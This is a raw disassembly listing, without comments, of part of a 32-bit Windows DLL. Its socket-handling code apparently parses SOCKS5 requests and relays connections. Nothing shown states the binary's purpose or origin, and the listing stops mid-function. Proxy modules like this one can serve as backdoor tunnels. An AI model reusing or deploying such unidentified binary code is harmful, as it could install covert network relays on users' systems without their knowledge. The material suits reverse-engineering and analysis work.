100023df:	ff 15 4c e2 00 10    	call   *0x1000e24c
100023e5:	ff 75 d8             	pushl  -0x28(%ebp)
100023e8:	e8 26 46 00 00       	call   0x10006a13
100023ed:	59                   	pop    %ecx
100023ee:	8d 45 a8             	lea    -0x58(%ebp),%eax
100023f1:	e8 af fa ff ff       	call   0x10001ea5
100023f6:	8d 45 c0             	lea    -0x40(%ebp),%eax
100023f9:	e8 a7 fa ff ff       	call   0x10001ea5
100023fe:	8b 45 f8             	mov    -0x8(%ebp),%eax
10002401:	eb 1c                	jmp    0x1000241f
10002403:	52                   	push   %edx
10002404:	e8 0a 46 00 00       	call   0x10006a13
10002409:	59                   	pop    %ecx
1000240a:	8d 45 a8             	lea    -0x58(%ebp),%eax
1000240d:	e8 93 fa ff ff       	call   0x10001ea5
10002412:	8d 45 c0             	lea    -0x40(%ebp),%eax
10002415:	e8 8b fa ff ff       	call   0x10001ea5
1000241a:	b8 4f 05 00 00       	mov    $0x54f,%eax
1000241f:	5f                   	pop    %edi
10002420:	5e                   	pop    %esi
10002421:	5b                   	pop    %ebx
10002422:	c9                   	leave  
10002423:	c3                   	ret    
10002424:	56                   	push   %esi
10002425:	ff 15 5c e1 00 10    	call   *0x1000e15c
1000242b:	6a 00                	push   $0x0
1000242d:	6a 00                	push   $0x0
1000242f:	6a 01                	push   $0x1
10002431:	6a 00                	push   $0x0
10002433:	ff 15 28 e1 00 10    	call   *0x1000e128
10002439:	83 66 18 00          	andl   $0x0,0x18(%esi)
1000243d:	89 46 1c             	mov    %eax,0x1c(%esi)
10002440:	8b c6                	mov    %esi,%eax
10002442:	c3                   	ret    
10002443:	56                   	push   %esi
10002444:	8b f0                	mov    %eax,%esi
10002446:	56                   	push   %esi
10002447:	ff 15 68 e1 00 10    	call   *0x1000e168
1000244d:	ff 76 1c             	pushl  0x1c(%esi)
10002450:	ff 15 50 e1 00 10    	call   *0x1000e150
10002456:	8b 76 18             	mov    0x18(%esi),%esi
10002459:	85 f6                	test   %esi,%esi
1000245b:	74 20                	je     0x1000247d
1000245d:	57                   	push   %edi
1000245e:	8b fe                	mov    %esi,%edi
10002460:	8b 47 0c             	mov    0xc(%edi),%eax
10002463:	8b 76 10             	mov    0x10(%esi),%esi
10002466:	85 c0                	test   %eax,%eax
10002468:	74 07                	je     0x10002471
1000246a:	50                   	push   %eax
1000246b:	e8 a3 45 00 00       	call   0x10006a13
10002470:	59                   	pop    %ecx
10002471:	57                   	push   %edi
10002472:	e8 9c 45 00 00       	call   0x10006a13
10002477:	59                   	pop    %ecx
10002478:	85 f6                	test   %esi,%esi
1000247a:	75 e2                	jne    0x1000245e
1000247c:	5f                   	pop    %edi
1000247d:	5e                   	pop    %esi
1000247e:	c3                   	ret    
1000247f:	8b 49 18             	mov    0x18(%ecx),%ecx
10002482:	33 c0                	xor    %eax,%eax
10002484:	eb 0d                	jmp    0x10002493
10002486:	8b 51 08             	mov    0x8(%ecx),%edx
10002489:	8b 49 10             	mov    0x10(%ecx),%ecx
1000248c:	83 fa ff             	cmp    $0xffffffff,%edx
1000248f:	74 02                	je     0x10002493
10002491:	03 c2                	add    %edx,%eax
10002493:	85 c9                	test   %ecx,%ecx
10002495:	75 ef                	jne    0x10002486
10002497:	c3                   	ret    
10002498:	57                   	push   %edi
10002499:	6a 18                	push   $0x18
1000249b:	e8 44 45 00 00       	call   0x100069e4
100024a0:	8b f8                	mov    %eax,%edi
100024a2:	59                   	pop    %ecx
100024a3:	85 ff                	test   %edi,%edi
100024a5:	74 17                	je     0x100024be
100024a7:	6a 18                	push   $0x18
100024a9:	6a 00                	push   $0x0
100024ab:	57                   	push   %edi
100024ac:	e8 79 b8 00 00       	call   0x1000dd2a
100024b1:	8b 46 18             	mov    0x18(%esi),%eax
100024b4:	83 c4 0c             	add    $0xc,%esp
100024b7:	85 c0                	test   %eax,%eax
100024b9:	75 09                	jne    0x100024c4
100024bb:	89 7e 18             	mov    %edi,0x18(%esi)
100024be:	8b c7                	mov    %edi,%eax
100024c0:	5f                   	pop    %edi
100024c1:	c3                   	ret    
100024c2:	8b c1                	mov    %ecx,%eax
100024c4:	8b 48 10             	mov    0x10(%eax),%ecx
100024c7:	85 c9                	test   %ecx,%ecx
100024c9:	75 f7                	jne    0x100024c2
100024cb:	89 78 10             	mov    %edi,0x10(%eax)
100024ce:	eb ee                	jmp    0x100024be
100024d0:	55                   	push   %ebp
100024d1:	8b ec                	mov    %esp,%ebp
100024d3:	56                   	push   %esi
100024d4:	57                   	push   %edi
100024d5:	8b f0                	mov    %eax,%esi
100024d7:	56                   	push   %esi
100024d8:	ff 15 64 e1 00 10    	call   *0x1000e164
100024de:	e8 b5 ff ff ff       	call   0x10002498
100024e3:	8b f8                	mov    %eax,%edi
100024e5:	85 ff                	test   %edi,%edi
100024e7:	74 3f                	je     0x10002528
100024e9:	8b 45 0c             	mov    0xc(%ebp),%eax
100024ec:	89 07                	mov    %eax,(%edi)
100024ee:	8b 45 10             	mov    0x10(%ebp),%eax
100024f1:	89 47 04             	mov    %eax,0x4(%edi)
100024f4:	85 db                	test   %ebx,%ebx
100024f6:	74 0a                	je     0x10002502
100024f8:	53                   	push   %ebx
100024f9:	e8 e6 44 00 00       	call   0x100069e4
100024fe:	59                   	pop    %ecx
100024ff:	89 47 0c             	mov    %eax,0xc(%edi)
10002502:	8b 47 0c             	mov    0xc(%edi),%eax
10002505:	85 c0                	test   %eax,%eax
10002507:	74 12                	je     0x1000251b
10002509:	53                   	push   %ebx
1000250a:	ff 75 08             	pushl  0x8(%ebp)
1000250d:	50                   	push   %eax
1000250e:	e8 fd b7 00 00       	call   0x1000dd10
10002513:	83 c4 0c             	add    $0xc,%esp
10002516:	89 5f 08             	mov    %ebx,0x8(%edi)
10002519:	eb 04                	jmp    0x1000251f
1000251b:	83 4f 08 ff          	orl    $0xffffffff,0x8(%edi)
1000251f:	ff 76 1c             	pushl  0x1c(%esi)
10002522:	ff 15 3c e1 00 10    	call   *0x1000e13c
10002528:	56                   	push   %esi
10002529:	ff 15 60 e1 00 10    	call   *0x1000e160
1000252f:	5f                   	pop    %edi
10002530:	5e                   	pop    %esi
10002531:	5d                   	pop    %ebp
10002532:	c2 0c 00             	ret    $0xc
10002535:	55                   	push   %ebp
10002536:	8b ec                	mov    %esp,%ebp
10002538:	57                   	push   %edi
10002539:	56                   	push   %esi
1000253a:	8b f8                	mov    %eax,%edi
1000253c:	ff 15 64 e1 00 10    	call   *0x1000e164
10002542:	8b 46 18             	mov    0x18(%esi),%eax
10002545:	85 c0                	test   %eax,%eax
10002547:	74 58                	je     0x100025a1
10002549:	85 db                	test   %ebx,%ebx
1000254b:	74 0a                	je     0x10002557
1000254d:	8b 08                	mov    (%eax),%ecx
1000254f:	89 0b                	mov    %ecx,(%ebx)
10002551:	8b 40 04             	mov    0x4(%eax),%eax
10002554:	89 43 04             	mov    %eax,0x4(%ebx)
10002557:	85 ff                	test   %edi,%edi
10002559:	74 10                	je     0x1000256b
1000255b:	8b 46 18             	mov    0x18(%esi),%eax
1000255e:	8b 40 08             	mov    0x8(%eax),%eax
10002561:	89 07                	mov    %eax,(%edi)
10002563:	83 f8 ff             	cmp    $0xffffffff,%eax
10002566:	75 03                	jne    0x1000256b
10002568:	83 27 00             	andl   $0x0,(%edi)
1000256b:	8b 3f                	mov    (%edi),%edi
1000256d:	85 ff                	test   %edi,%edi
1000256f:	74 12                	je     0x10002583
10002571:	8b 46 18             	mov    0x18(%esi),%eax
10002574:	57                   	push   %edi
10002575:	ff 70 0c             	pushl  0xc(%eax)
10002578:	ff 75 08             	pushl  0x8(%ebp)
1000257b:	e8 90 b7 00 00       	call   0x1000dd10
10002580:	83 c4 0c             	add    $0xc,%esp
10002583:	8b 7e 18             	mov    0x18(%esi),%edi
10002586:	8b 47 10             	mov    0x10(%edi),%eax
10002589:	89 46 18             	mov    %eax,0x18(%esi)
1000258c:	8b 47 0c             	mov    0xc(%edi),%eax
1000258f:	85 c0                	test   %eax,%eax
10002591:	74 07                	je     0x1000259a
10002593:	50                   	push   %eax
10002594:	e8 7a 44 00 00       	call   0x10006a13
10002599:	59                   	pop    %ecx
1000259a:	57                   	push   %edi
1000259b:	e8 73 44 00 00       	call   0x10006a13
100025a0:	59                   	pop    %ecx
100025a1:	83 7e 18 00          	cmpl   $0x0,0x18(%esi)
100025a5:	5f                   	pop    %edi
100025a6:	75 09                	jne    0x100025b1
100025a8:	ff 76 1c             	pushl  0x1c(%esi)
100025ab:	ff 15 74 e1 00 10    	call   *0x1000e174
100025b1:	56                   	push   %esi
100025b2:	ff 15 60 e1 00 10    	call   *0x1000e160
100025b8:	33 c0                	xor    %eax,%eax
100025ba:	40                   	inc    %eax
100025bb:	5d                   	pop    %ebp
100025bc:	c2 04 00             	ret    $0x4
100025bf:	57                   	push   %edi
100025c0:	33 ff                	xor    %edi,%edi
100025c2:	56                   	push   %esi
100025c3:	47                   	inc    %edi
100025c4:	ff 15 64 e1 00 10    	call   *0x1000e164
100025ca:	83 7e 18 00          	cmpl   $0x0,0x18(%esi)
100025ce:	75 0b                	jne    0x100025db
100025d0:	ff 76 1c             	pushl  0x1c(%esi)
100025d3:	ff 15 74 e1 00 10    	call   *0x1000e174
100025d9:	33 ff                	xor    %edi,%edi
100025db:	56                   	push   %esi
100025dc:	ff 15 60 e1 00 10    	call   *0x1000e160
100025e2:	8b c7                	mov    %edi,%eax
100025e4:	5f                   	pop    %edi
100025e5:	c3                   	ret    
100025e6:	68 00 00 01 00       	push   $0x10000
100025eb:	e8 f4 43 00 00       	call   0x100069e4
100025f0:	59                   	pop    %ecx
100025f1:	89 06                	mov    %eax,(%esi)
100025f3:	85 c0                	test   %eax,%eax
100025f5:	74 0d                	je     0x10002604
100025f7:	6a 0c                	push   $0xc
100025f9:	6a 00                	push   $0x0
100025fb:	50                   	push   %eax
100025fc:	e8 29 b7 00 00       	call   0x1000dd2a
10002601:	83 c4 0c             	add    $0xc,%esp
10002604:	8b c6                	mov    %esi,%eax
10002606:	c3                   	ret    
10002607:	55                   	push   %ebp
10002608:	8b ec                	mov    %esp,%ebp
1000260a:	81 ec 08 03 00 00    	sub    $0x308,%esp
10002610:	56                   	push   %esi
10002611:	e8 6a 00 00 00       	call   0x10002680
10002616:	8b f0                	mov    %eax,%esi
10002618:	39 75 08             	cmp    %esi,0x8(%ebp)
1000261b:	72 53                	jb     0x10002670
1000261d:	56                   	push   %esi
1000261e:	53                   	push   %ebx
1000261f:	8b c7                	mov    %edi,%eax
10002621:	e8 68 5f 00 00       	call   0x1000858e
10002626:	50                   	push   %eax
10002627:	e8 e4 b6 00 00       	call   0x1000dd10
1000262c:	8b 07                	mov    (%edi),%eax
1000262e:	8b 55 08             	mov    0x8(%ebp),%edx
10002631:	8b 48 08             	mov    0x8(%eax),%ecx
10002634:	2b d6                	sub    %esi,%edx
10002636:	83 c4 0c             	add    $0xc,%esp
10002639:	3b ca                	cmp    %edx,%ecx
1000263b:	77 15                	ja     0x10002652
1000263d:	51                   	push   %ecx
1000263e:	03 f3                	add    %ebx,%esi
10002640:	83 c0 0c             	add    $0xc,%eax
10002643:	56                   	push   %esi
10002644:	50                   	push   %eax
10002645:	e8 c6 b6 00 00       	call   0x1000dd10
1000264a:	33 c0                	xor    %eax,%eax
1000264c:	83 c4 0c             	add    $0xc,%esp
1000264f:	40                   	inc    %eax
10002650:	eb 20                	jmp    0x10002672
10002652:	ff 70 04             	pushl  0x4(%eax)
10002655:	ff 30                	pushl  (%eax)
10002657:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
1000265d:	ff 75 08             	pushl  0x8(%ebp)
10002660:	51                   	push   %ecx
10002661:	68 d8 e2 00 10       	push   $0x1000e2d8
10002666:	50                   	push   %eax
10002667:	ff 15 cc e1 00 10    	call   *0x1000e1cc
1000266d:	83 c4 18             	add    $0x18,%esp
10002670:	33 c0                	xor    %eax,%eax
10002672:	5e                   	pop    %esi
10002673:	c9                   	leave  
10002674:	c2 04 00             	ret    $0x4
10002677:	8b 00                	mov    (%eax),%eax
10002679:	8b 40 08             	mov    0x8(%eax),%eax
1000267c:	83 c0 0c             	add    $0xc,%eax
1000267f:	c3                   	ret    
10002680:	6a 0c                	push   $0xc
10002682:	58                   	pop    %eax
10002683:	c3                   	ret    
10002684:	8b 00                	mov    (%eax),%eax
10002686:	83 c0 0c             	add    $0xc,%eax
10002689:	c3                   	ret    
1000268a:	8b 00                	mov    (%eax),%eax
1000268c:	8b 40 08             	mov    0x8(%eax),%eax
1000268f:	c3                   	ret    
10002690:	8b 08                	mov    (%eax),%ecx
10002692:	8b 01                	mov    (%ecx),%eax
10002694:	8b 51 04             	mov    0x4(%ecx),%edx
10002697:	c3                   	ret    
10002698:	55                   	push   %ebp
10002699:	8b ec                	mov    %esp,%ebp
1000269b:	8b 00                	mov    (%eax),%eax
1000269d:	8b 4d 08             	mov    0x8(%ebp),%ecx
100026a0:	89 08                	mov    %ecx,(%eax)
100026a2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100026a5:	89 48 04             	mov    %ecx,0x4(%eax)
100026a8:	5d                   	pop    %ebp
100026a9:	c2 08 00             	ret    $0x8
100026ac:	55                   	push   %ebp
100026ad:	8b ec                	mov    %esp,%ebp
100026af:	33 c0                	xor    %eax,%eax
100026b1:	83 7d 08 0a          	cmpl   $0xa,0x8(%ebp)
100026b5:	72 43                	jb     0x100026fa
100026b7:	80 39 05             	cmpb   $0x5,(%ecx)
100026ba:	75 3e                	jne    0x100026fa
100026bc:	8a 51 01             	mov    0x1(%ecx),%dl
100026bf:	80 fa 01             	cmp    $0x1,%dl
100026c2:	74 0a                	je     0x100026ce
100026c4:	80 fa 02             	cmp    $0x2,%dl
100026c7:	74 05                	je     0x100026ce
100026c9:	80 fa 03             	cmp    $0x3,%dl
100026cc:	75 2c                	jne    0x100026fa
100026ce:	38 41 02             	cmp    %al,0x2(%ecx)
100026d1:	75 27                	jne    0x100026fa
100026d3:	8a 51 03             	mov    0x3(%ecx),%dl
100026d6:	80 fa 01             	cmp    $0x1,%dl
100026d9:	75 09                	jne    0x100026e4
100026db:	33 c0                	xor    %eax,%eax
100026dd:	83 7d 08 0a          	cmpl   $0xa,0x8(%ebp)
100026e1:	0f 94 c0             	sete   %al
100026e4:	80 fa 03             	cmp    $0x3,%dl
100026e7:	75 11                	jne    0x100026fa
100026e9:	0f b6 41 04          	movzbl 0x4(%ecx),%eax
100026ed:	83 c0 07             	add    $0x7,%eax
100026f0:	33 c9                	xor    %ecx,%ecx
100026f2:	39 45 08             	cmp    %eax,0x8(%ebp)
100026f5:	0f 94 c1             	sete   %cl
100026f8:	8b c1                	mov    %ecx,%eax
100026fa:	5d                   	pop    %ebp
100026fb:	c3                   	ret    
100026fc:	55                   	push   %ebp
100026fd:	8b ec                	mov    %esp,%ebp
100026ff:	83 e4 f8             	and    $0xfffffff8,%esp
10002702:	81 ec 7c 02 00 00    	sub    $0x27c,%esp
10002708:	53                   	push   %ebx
10002709:	56                   	push   %esi
1000270a:	57                   	push   %edi
1000270b:	8d 4c 24 40          	lea    0x40(%esp),%ecx
1000270f:	e8 7f f7 ff ff       	call   0x10001e93
10002714:	e8 8d 7c 00 00       	call   0x1000a3a6
10002719:	33 db                	xor    %ebx,%ebx
1000271b:	3b c3                	cmp    %ebx,%eax
1000271d:	74 0b                	je     0x1000272a
1000271f:	e8 8f f4 ff ff       	call   0x10001bb3
10002724:	89 44 24 24          	mov    %eax,0x24(%esp)
10002728:	eb 04                	jmp    0x1000272e
1000272a:	89 5c 24 24          	mov    %ebx,0x24(%esp)
1000272e:	8b 7d 08             	mov    0x8(%ebp),%edi
10002731:	39 5f 0c             	cmp    %ebx,0xc(%edi)
10002734:	75 11                	jne    0x10002747
10002736:	ff 15 7c e2 00 10    	call   *0x1000e27c
1000273c:	89 47 0c             	mov    %eax,0xc(%edi)
1000273f:	3b c3                	cmp    %ebx,%eax
10002741:	0f 84 0b 05 00 00    	je     0x10002c52
10002747:	6a 23                	push   $0x23
10002749:	ff 77 0c             	pushl  0xc(%edi)
1000274c:	ff 37                	pushl  (%edi)
1000274e:	ff 15 74 e2 00 10    	call   *0x1000e274
10002754:	83 f8 ff             	cmp    $0xffffffff,%eax
10002757:	0f 84 f5 04 00 00    	je     0x10002c52
1000275d:	6a 24                	push   $0x24
1000275f:	e8 80 42 00 00       	call   0x100069e4
10002764:	59                   	pop    %ecx
10002765:	8b f0                	mov    %eax,%esi
10002767:	89 44 24 10          	mov    %eax,0x10(%esp)
1000276b:	e8 b4 fc ff ff       	call   0x10002424
10002770:	be 00 00 01 00       	mov    $0x10000,%esi
10002775:	56                   	push   %esi
10002776:	e8 69 42 00 00       	call   0x100069e4
1000277b:	59                   	pop    %ecx
1000277c:	56                   	push   %esi
1000277d:	89 44 24 34          	mov    %eax,0x34(%esp)
10002781:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
10002785:	89 5c 24 24          	mov    %ebx,0x24(%esp)
10002789:	e8 56 42 00 00       	call   0x100069e4
1000278e:	83 64 24 2c 00       	andl   $0x0,0x2c(%esp)
10002793:	83 7f 08 00          	cmpl   $0x0,0x8(%edi)
10002797:	8b d8                	mov    %eax,%ebx
10002799:	8b 47 0c             	mov    0xc(%edi),%eax
1000279c:	89 44 24 54          	mov    %eax,0x54(%esp)
100027a0:	8b 87 ec 00 00 00    	mov    0xec(%edi),%eax
100027a6:	89 44 24 58          	mov    %eax,0x58(%esp)
100027aa:	8b 44 24 14          	mov    0x14(%esp),%eax
100027ae:	89 5c 24 30          	mov    %ebx,0x30(%esp)
100027b2:	8b 40 1c             	mov    0x1c(%eax),%eax
100027b5:	59                   	pop    %ecx
100027b6:	89 5c 24 34          	mov    %ebx,0x34(%esp)
100027ba:	89 44 24 58          	mov    %eax,0x58(%esp)
100027be:	75 0d                	jne    0x100027cd
100027c0:	56                   	push   %esi
100027c1:	89 77 04             	mov    %esi,0x4(%edi)
100027c4:	e8 1b 42 00 00       	call   0x100069e4
100027c9:	59                   	pop    %ecx
100027ca:	89 47 08             	mov    %eax,0x8(%edi)
100027cd:	e8 ae fe ff ff       	call   0x10002680
100027d2:	89 44 24 38          	mov    %eax,0x38(%esp)
100027d6:	33 c0                	xor    %eax,%eax
100027d8:	50                   	push   %eax
100027d9:	68 88 13 00 00       	push   $0x1388
100027de:	50                   	push   %eax
100027df:	89 44 24 20          	mov    %eax,0x20(%esp)
100027e3:	8d 44 24 5c          	lea    0x5c(%esp),%eax
100027e7:	50                   	push   %eax
100027e8:	6a 03                	push   $0x3
100027ea:	ff 15 8c e2 00 10    	call   *0x1000e28c
100027f0:	33 f6                	xor    %esi,%esi
100027f2:	3b c6                	cmp    %esi,%eax
100027f4:	0f 85 9a 03 00 00    	jne    0x10002b94
100027fa:	6a 2c                	push   $0x2c
100027fc:	8d 44 24 60          	lea    0x60(%esp),%eax
10002800:	56                   	push   %esi
10002801:	50                   	push   %eax
10002802:	e8 23 b5 00 00       	call   0x1000dd2a
10002807:	83 c4 0c             	add    $0xc,%esp
1000280a:	8d 44 24 5c          	lea    0x5c(%esp),%eax
1000280e:	50                   	push   %eax
1000280f:	ff 77 0c             	pushl  0xc(%edi)
10002812:	ff 37                	pushl  (%edi)
10002814:	ff 15 6c e2 00 10    	call   *0x1000e26c
1000281a:	83 f8 ff             	cmp    $0xffffffff,%eax
1000281d:	0f 84 2f 04 00 00    	je     0x10002c52
10002823:	f6 44 24 5c 02       	testb  $0x2,0x5c(%esp)
10002828:	0f 84 9a 00 00 00    	je     0x100028c8
1000282e:	39 74 24 64          	cmp    %esi,0x64(%esp)
10002832:	0f 85 90 00 00 00    	jne    0x100028c8
10002838:	39 74 24 18          	cmp    %esi,0x18(%esp)
1000283c:	0f 84 86 00 00 00    	je     0x100028c8
10002842:	56                   	push   %esi
10002843:	56                   	push   %esi
10002844:	56                   	push   %esi
10002845:	8d 44 24 2c          	lea    0x2c(%esp),%eax
10002849:	50                   	push   %eax
1000284a:	6a 01                	push   $0x1
1000284c:	8d 44 24 3c          	lea    0x3c(%esp),%eax
10002850:	50                   	push   %eax
10002851:	ff 37                	pushl  (%edi)
10002853:	ff 15 60 e2 00 10    	call   *0x1000e260
10002859:	83 f8 ff             	cmp    $0xffffffff,%eax
1000285c:	74 14                	je     0x10002872
1000285e:	8b 4c 24 20          	mov    0x20(%esp),%ecx
10002862:	3b 4c 24 28          	cmp    0x28(%esp),%ecx
10002866:	72 0a                	jb     0x10002872
10002868:	3b c6                	cmp    %esi,%eax
1000286a:	75 1b                	jne    0x10002887
1000286c:	89 74 24 18          	mov    %esi,0x18(%esp)
10002870:	eb 15                	jmp    0x10002887
10002872:	ff 15 64 e2 00 10    	call   *0x1000e264
10002878:	3d 33 27 00 00       	cmp    $0x2733,%eax
1000287d:	75 49                	jne    0x100028c8
1000287f:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
10002886:	00 
10002887:	ff 15 40 e1 00 10    	call   *0x1000e140
1000288d:	8b 8f f0 00 00 00    	mov    0xf0(%edi),%ecx
10002893:	89 41 34             	mov    %eax,0x34(%ecx)
10002896:	39 74 24 18          	cmp    %esi,0x18(%esp)
1000289a:	75 2c                	jne    0x100028c8
1000289c:	8b 74 24 10          	mov    0x10(%esp),%esi
100028a0:	e8 1a fd ff ff       	call   0x100025bf
100028a5:	85 c0                	test   %eax,%eax
100028a7:	74 1d                	je     0x100028c6
100028a9:	8d 4b 0c             	lea    0xc(%ebx),%ecx
100028ac:	8d 43 08             	lea    0x8(%ebx),%eax
100028af:	51                   	push   %ecx
100028b0:	e8 80 fc ff ff       	call   0x10002535
100028b5:	8b 43 08             	mov    0x8(%ebx),%eax
100028b8:	83 c0 0c             	add    $0xc,%eax
100028bb:	89 44 24 28          	mov    %eax,0x28(%esp)
100028bf:	33 f6                	xor    %esi,%esi
100028c1:	e9 7c ff ff ff       	jmp    0x10002842
100028c6:	33 f6                	xor    %esi,%esi
100028c8:	f6 44 24 5c 01       	testb  $0x1,0x5c(%esp)
100028cd:	0f 84 b1 02 00 00    	je     0x10002b84
100028d3:	39 74 24 60          	cmp    %esi,0x60(%esp)
100028d7:	0f 85 a7 02 00 00    	jne    0x10002b84
100028dd:	8b 47 10             	mov    0x10(%edi),%eax
100028e0:	3b c6                	cmp    %esi,%eax
100028e2:	75 47                	jne    0x1000292b
100028e4:	56                   	push   %esi
100028e5:	56                   	push   %esi
100028e6:	8d 44 24 24          	lea    0x24(%esp),%eax
100028ea:	50                   	push   %eax
100028eb:	89 74 24 28          	mov    %esi,0x28(%esp)
100028ef:	8d 44 24 20          	lea    0x20(%esp),%eax
100028f3:	50                   	push   %eax
100028f4:	33 f6                	xor    %esi,%esi
100028f6:	46                   	inc    %esi
100028f7:	56                   	push   %esi
100028f8:	8d 47 04             	lea    0x4(%edi),%eax
100028fb:	50                   	push   %eax
100028fc:	ff 37                	pushl  (%edi)
100028fe:	ff 15 58 e2 00 10    	call   *0x1000e258
10002904:	83 f8 ff             	cmp    $0xffffffff,%eax
10002907:	0f 84 3f 03 00 00    	je     0x10002c4c
1000290d:	83 7c 24 14 04       	cmpl   $0x4,0x14(%esp)
10002912:	0f 85 34 03 00 00    	jne    0x10002c4c
10002918:	8b 47 08             	mov    0x8(%edi),%eax
1000291b:	39 30                	cmp    %esi,(%eax)
1000291d:	0f 85 2f 03 00 00    	jne    0x10002c52
10002923:	89 77 10             	mov    %esi,0x10(%edi)
10002926:	e9 59 02 00 00       	jmp    0x10002b84
1000292b:	83 f8 01             	cmp    $0x1,%eax
1000292e:	0f 85 1e 03 00 00    	jne    0x10002c52
10002934:	8d 5f 04             	lea    0x4(%edi),%ebx
10002937:	56                   	push   %esi
10002938:	56                   	push   %esi
10002939:	8d 44 24 24          	lea    0x24(%esp),%eax
1000293d:	50                   	push   %eax
1000293e:	8d 44 24 20          	lea    0x20(%esp),%eax
10002942:	50                   	push   %eax
10002943:	6a 01                	push   $0x1
10002945:	53                   	push   %ebx
10002946:	ff 37                	pushl  (%edi)
10002948:	89 74 24 30          	mov    %esi,0x30(%esp)
1000294c:	89 74 24 38          	mov    %esi,0x38(%esp)
10002950:	ff 15 58 e2 00 10    	call   *0x1000e258
10002956:	83 f8 ff             	cmp    $0xffffffff,%eax
10002959:	74 53                	je     0x100029ae
1000295b:	39 74 24 14          	cmp    %esi,0x14(%esp)
1000295f:	74 43                	je     0x100029a4
10002961:	ff 15 40 e1 00 10    	call   *0x1000e140
10002967:	8b 8f f0 00 00 00    	mov    0xf0(%edi),%ecx
1000296d:	89 41 34             	mov    %eax,0x34(%ecx)
10002970:	ff 74 24 14          	pushl  0x14(%esp)
10002974:	8d 44 24 44          	lea    0x44(%esp),%eax
10002978:	ff 77 08             	pushl  0x8(%edi)
1000297b:	e8 54 f5 ff ff       	call   0x10001ed4
10002980:	8d 4c 24 40          	lea    0x40(%esp),%ecx
10002984:	e8 3a f5 ff ff       	call   0x10001ec3
10002989:	50                   	push   %eax
1000298a:	ff 74 24 18          	pushl  0x18(%esp)
1000298e:	8d 84 24 90 00 00 00 	lea    0x90(%esp),%eax
10002995:	68 90 e3 00 10       	push   $0x1000e390
1000299a:	50                   	push   %eax
1000299b:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100029a1:	83 c4 10             	add    $0x10,%esp
100029a4:	8b 44 24 14          	mov    0x14(%esp),%eax
100029a8:	3b 03                	cmp    (%ebx),%eax
100029aa:	74 8b                	je     0x10002937
100029ac:	eb 11                	jmp    0x100029bf
100029ae:	ff 15 64 e2 00 10    	call   *0x1000e264
100029b4:	3d 33 27 00 00       	cmp    $0x2733,%eax
100029b9:	0f 85 93 02 00 00    	jne    0x10002c52
100029bf:	8d 74 24 0c          	lea    0xc(%esp),%esi
100029c3:	e8 1e fc ff ff       	call   0x100025e6
100029c8:	8b 5c 24 30          	mov    0x30(%esp),%ebx
100029cc:	6a 00                	push   $0x0
100029ce:	68 00 00 01 00       	push   $0x10000
100029d3:	8d 44 24 48          	lea    0x48(%esp),%eax
100029d7:	50                   	push   %eax
100029d8:	8b cb                	mov    %ebx,%ecx
100029da:	e8 cf f5 ff ff       	call   0x10001fae
100029df:	8b f0                	mov    %eax,%esi
100029e1:	56                   	push   %esi
100029e2:	8d 7c 24 10          	lea    0x10(%esp),%edi
100029e6:	e8 1c fc ff ff       	call   0x10002607
100029eb:	85 c0                	test   %eax,%eax
100029ed:	0f 84 6a 01 00 00    	je     0x10002b5d
100029f3:	8b c7                	mov    %edi,%eax
100029f5:	e8 96 fc ff ff       	call   0x10002690
100029fa:	8b 74 24 24          	mov    0x24(%esp),%esi
100029fe:	52                   	push   %edx
100029ff:	50                   	push   %eax
10002a00:	e8 8e f2 ff ff       	call   0x10001c93
10002a05:	85 c0                	test   %eax,%eax
10002a07:	0f 85 d5 00 00 00    	jne    0x10002ae2
10002a0d:	8b c7                	mov    %edi,%eax
10002a0f:	e8 70 fc ff ff       	call   0x10002684
10002a14:	8b c8                	mov    %eax,%ecx
10002a16:	8b c7                	mov    %edi,%eax
10002a18:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
10002a1c:	e8 69 fc ff ff       	call   0x1000268a
10002a21:	50                   	push   %eax
10002a22:	e8 85 fc ff ff       	call   0x100026ac
10002a27:	59                   	pop    %ecx
10002a28:	85 c0                	test   %eax,%eax
10002a2a:	0f 84 b2 00 00 00    	je     0x10002ae2
10002a30:	6a 38                	push   $0x38
10002a32:	e8 ad 3f 00 00       	call   0x100069e4
10002a37:	8b f8                	mov    %eax,%edi
10002a39:	59                   	pop    %ecx
10002a3a:	85 ff                	test   %edi,%edi
10002a3c:	0f 84 f5 00 00 00    	je     0x10002b37
10002a42:	be f8 00 00 00       	mov    $0xf8,%esi
10002a47:	56                   	push   %esi
10002a48:	e8 97 3f 00 00       	call   0x100069e4
10002a4d:	59                   	pop    %ecx
10002a4e:	56                   	push   %esi
10002a4f:	ff 75 08             	pushl  0x8(%ebp)
10002a52:	89 47 08             	mov    %eax,0x8(%edi)
10002a55:	50                   	push   %eax
10002a56:	e8 b5 b2 00 00       	call   0x1000dd10
10002a5b:	83 c4 0c             	add    $0xc,%esp
10002a5e:	8d 44 24 0c          	lea    0xc(%esp),%eax
10002a62:	e8 29 fc ff ff       	call   0x10002690
10002a67:	8b 5c 24 24          	mov    0x24(%esp),%ebx
10002a6b:	89 07                	mov    %eax,(%edi)
10002a6d:	33 c0                	xor    %eax,%eax
10002a6f:	50                   	push   %eax
10002a70:	50                   	push   %eax
10002a71:	6a 01                	push   $0x1
10002a73:	50                   	push   %eax
10002a74:	89 57 04             	mov    %edx,0x4(%edi)
10002a77:	89 5f 2c             	mov    %ebx,0x2c(%edi)
10002a7a:	ff 15 28 e1 00 10    	call   *0x1000e128
10002a80:	8d 77 0c             	lea    0xc(%edi),%esi
10002a83:	89 47 30             	mov    %eax,0x30(%edi)
10002a86:	e8 99 f9 ff ff       	call   0x10002424
10002a8b:	8b 44 24 10          	mov    0x10(%esp),%eax
10002a8f:	83 64 24 3c 00       	andl   $0x0,0x3c(%esp)
10002a94:	89 47 34             	mov    %eax,0x34(%edi)
10002a97:	57                   	push   %edi
10002a98:	8d 44 24 10          	lea    0x10(%esp),%eax
10002a9c:	e8 ef fb ff ff       	call   0x10002690
10002aa1:	52                   	push   %edx
10002aa2:	50                   	push   %eax
10002aa3:	53                   	push   %ebx
10002aa4:	e8 67 f1 ff ff       	call   0x10001c10
10002aa9:	6a ff                	push   $0xffffffff
10002aab:	6a ff                	push   $0xffffffff
10002aad:	8d 44 24 14          	lea    0x14(%esp),%eax
10002ab1:	e8 d4 fb ff ff       	call   0x1000268a
10002ab6:	ff 74 24 24          	pushl  0x24(%esp)
